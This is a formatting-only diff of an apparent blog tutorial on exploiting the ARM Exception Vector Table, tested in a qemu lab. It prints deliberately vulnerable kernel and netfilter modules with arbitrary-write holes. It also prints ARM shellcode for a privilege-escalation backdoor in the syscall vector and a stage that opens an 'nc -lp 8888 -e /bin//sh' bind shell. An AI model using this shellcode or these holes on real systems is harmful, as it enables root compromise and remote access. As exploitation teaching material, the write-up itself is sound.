@@ -35,13 +35,13 @@
 &lt;/div&gt;
 &lt;h1 id="arm-exceptions-and-the-exception-vector-table"&gt;ARM Exceptions and the Exception Vector Table&lt;/h1&gt;
 &lt;p&gt;In a few words, the EVT is to ARM what the IDT is to x86. In the ARM world, an exception is an event that causes the CPU to stop or pause from executing the current set of instructions. When this exception occurs, the CPU diverts execution to another location called an exception handler. There are 7 exception types and each exception type is associated with a mode of operation. Modes of operation affect the processor's "permissions" in regards to system resources. There are in total 7 modes of operation. The following table maps some exception types to their associated modes of operation: &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt; Exception                   |       Mode            |     Description&lt;/span&gt;
-&lt;span class="err"&gt; ----------------------------|-----------------------|-------------------------------------------------------------------&lt;/span&gt;
-&lt;span class="err"&gt; Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.&lt;/span&gt;
-&lt;span class="err"&gt; Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.&lt;/span&gt;
-&lt;span class="err"&gt; Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.&lt;/span&gt;
-&lt;span class="err"&gt; Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.&lt;/span&gt;
-&lt;span class="err"&gt; Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Exception                   |       Mode            |     Description
+----------------------------|-----------------------|-------------------------------------------------------------------
+Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.
+Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.
+Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.
+Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.
+Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
@@ -51,16 +51,16 @@
 &lt;p&gt;&lt;center&gt;&lt;img alt="Banked Registers" src="/images/corrupting_arm_evt/banked_regs.png"&gt;&lt;/center&gt;  &lt;/p&gt;
 &lt;h2 id="the-exception-vector-table"&gt;The Exception Vector Table&lt;/h2&gt;
 &lt;p&gt;The vector table is a table that actually contains control transfer instructions that jump to the respective exception handlers. For example, when a software interrupt is raised, execution is transfered to the software interrupt entry in the table which in turn will jump to the syscall handler. Why is the EVT so interesting to target? Well because it is loaded at a known address in memory and it is writeable* and executable. On 32-bit ARM Linux this address is &lt;strong&gt;0xffff0000&lt;/strong&gt;. Each entry in the EVT is also at a known offset as can be seen on the following table:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt; Exception                   |       Address            &lt;/span&gt;
-&lt;span class="err"&gt; ----------------------------|-----------------------&lt;/span&gt;
-&lt;span class="err"&gt; Reset                       |      0xffff0000           &lt;/span&gt;
-&lt;span class="err"&gt; Undefined Instruction       |      0xffff0004       &lt;/span&gt;
-&lt;span class="err"&gt; SWI                         |      0xffff0008  &lt;/span&gt;
-&lt;span class="err"&gt; Prefetch Abort              |      0xffff000c       &lt;/span&gt;
-&lt;span class="err"&gt; Data Abort                  |      0xffff0010 &lt;/span&gt;
-&lt;span class="err"&gt; Reserved                    |      0xffff0014  &lt;/span&gt;
-&lt;span class="err"&gt; IRQ                         |      0xffff0018   &lt;/span&gt;
-&lt;span class="err"&gt; FIQ                         |      0xffff001c&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Exception                   |       Address            
+----------------------------|-----------------------
+Reset                       |      0xffff0000           
+Undefined Instruction       |      0xffff0004       
+SWI                         |      0xffff0008  
+Prefetch Abort              |      0xffff000c       
+Data Abort                  |      0xffff0010 
+Reserved                    |      0xffff0014  
+IRQ                         |      0xffff0018   
+FIQ                         |      0xffff001c  
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
@@ -71,24 +71,24 @@
 &lt;p&gt;There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let's try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let's now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.&lt;/p&gt;
 &lt;h2 id="local-scenario"&gt;Local scenario&lt;/h2&gt;
 &lt;p&gt;The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    &lt;span class="c1"&gt;// called when &amp;#39;write&amp;#39; system call is done on the device file&lt;/span&gt;
-    &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;ssize_t&lt;/span&gt; &lt;span class="nf"&gt;on_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;filp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;off&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;// called when &amp;#39;write&amp;#39; system call is done on the device file&lt;/span&gt;
+&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;ssize_t&lt;/span&gt; &lt;span class="nf"&gt;on_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;filp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;off&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
-        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-            &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-        &lt;span class="k"&gt;else&lt;/span&gt;
-            &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;
+        &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
-        &lt;span class="n"&gt;copy_from_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
-        &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;copy_from_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
 
-    &lt;span class="nl"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nl"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
@@ -104,24 +104,24 @@ It looks like nothing is there so we have around 480 bytes to store our backdoor
     2. Overwrite the SWI exception vector with a branch to &lt;em&gt;0xffff0020&lt;/em&gt;.&lt;br&gt;
     3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.&lt;br&gt;
 Here is the backdoor's code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    ;check if magic
-        cmp     r7, #0xb0000000
-        bne     exit
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;;check if magic
+    cmp     r7, #0xb0000000
+    bne     exit
 
-    elevate:
-        stmfd   sp!,{r0-r12}
+elevate:
+    stmfd   sp!,{r0-r12}
 
-        mov     r0, #0
-        ldr     r3, =0xc0049a00     ;prepare_kernel_cred
-        blx     r3
-        ldr     r4, =0xc0049438     ;commit_creds
-        blx     r4
+    mov     r0, #0
+    ldr     r3, =0xc0049a00     ;prepare_kernel_cred
+    blx     r3
+    ldr     r4, =0xc0049438     ;commit_creds
+    blx     r4
 
-        ldmfd   sp!, {r0-r12, pc}^  ;return to userland
+    ldmfd   sp!, {r0-r12, pc}^  ;return to userland
 
-    ;go to syscall handler
-    exit:
-        ldr     pc, [pc, #980]      ;go to normal swi handler
+;go to syscall handler
+exit:
+    ldr     pc, [pc, #980]      ;go to normal swi handler
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
@@ -129,17 +129,17 @@ Here is the backdoor's code:&lt;/p&gt;
 &lt;center&gt;&lt;img alt="Local PoC" src="/images/corrupting_arm_evt/local_poc.png"&gt;&lt;/center&gt;  &lt;/p&gt;
 &lt;h2 id="remote-scenario"&gt;Remote scenario&lt;/h2&gt;
 &lt;p&gt;For this example, we will use a netfilter module with a similar vulnerability as the previous one:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
-            &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;tcphdr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;skb_network_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_hdrlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
-            &lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ntohs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-            &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;9999&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
-                &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)((&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;doff&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
-                &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-                &lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)))[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-                &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-                &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-            &lt;span class="p"&gt;}&lt;/span&gt;
-        &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+    &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;tcphdr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;skb_network_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_hdrlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ntohs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;9999&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
+        &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)((&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;doff&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+        &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+        &lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)))[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+        &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
@@ -154,48 +154,48 @@ Every system call goes through the SWI vector so we won't have to wait too much 
     3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.&lt;br&gt;
     4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  &lt;/p&gt;
 &lt;p&gt;Here is the stage 1-2 shellcode:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    stage_1:
-        adr     lr, stage_2
-        push    {lr}
-        stmfd   sp!, {r0-r12}
-        ldr     r0, =0xe59ff410     ; intial value at 0xffff0008 which is
-                                    ; ldr     pc, [pc, #1040] ; 0xffff0420
-        ldr     r1, =0xffff0008
-        str     r0, [r1]
-        ldmfd   sp!, {r0-r12, pc}^  ; return to userland
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;stage_1:
+    adr     lr, stage_2
+    push    {lr}
+    stmfd   sp!, {r0-r12}
+    ldr     r0, =0xe59ff410     ; intial value at 0xffff0008 which is
+                                ; ldr     pc, [pc, #1040] ; 0xffff0420
+    ldr     r1, =0xffff0008
+    str     r0, [r1]
+    ldmfd   sp!, {r0-r12, pc}^  ; return to userland
 
-    stage_2:
-        ldr     r0, =0x6e69622f     ; /bin
-        ldr     r1, =0x68732f2f     ; /sh
-        eor     r2, r2, r2          ; 0x00000000
-        push    {r0, r1, r2}
-        mov     r0, sp
+stage_2:
+    ldr     r0, =0x6e69622f     ; /bin
+    ldr     r1, =0x68732f2f     ; /sh
+    eor     r2, r2, r2          ; 0x00000000
+    push    {r0, r1, r2}
+    mov     r0, sp
 
-        ldr     r4, =0x0000632d     ; -c\x00\x00
-        push    {r4}
-        mov     r4, sp
+    ldr     r4, =0x0000632d     ; -c\x00\x00
+    push    {r4}
+    mov     r4, sp
 
-        ldr     r5, =0x2d20636e
-        ldr     r6, =0x3820706c
-        ldr     r7, =0x20383838     ; nc -lp 8888 -e /bin//sh
-        ldr     r8, =0x2f20652d
-        ldr     r9, =0x2f6e6962
-        ldr     r10, =0x68732f2f
+    ldr     r5, =0x2d20636e
+    ldr     r6, =0x3820706c
+    ldr     r7, =0x20383838     ; nc -lp 8888 -e /bin//sh
+    ldr     r8, =0x2f20652d
+    ldr     r9, =0x2f6e6962
+    ldr     r10, =0x68732f2f
 
-        eor     r11, r11, r11
-        push    {r5-r11}
-        mov     r5, sp
-        push    {r2}
+    eor     r11, r11, r11
+    push    {r5-r11}
+    mov     r5, sp
+    push    {r2}
 
-        eor     r6, r6, r6
-        push    {r0,r4,r5, r6}
-        mov     r1, sp
-        mov     r7, #11
-        swi     0x0
+    eor     r6, r6, r6
+    push    {r0,r4,r5, r6}
+    mov     r1, sp
+    mov     r7, #11
+    swi     0x0
 
-        mov     r0, #99
-        mov     r7, #1
-        swi     0x0
+    mov     r0, #99
+    mov     r7, #1
+    swi     0x0
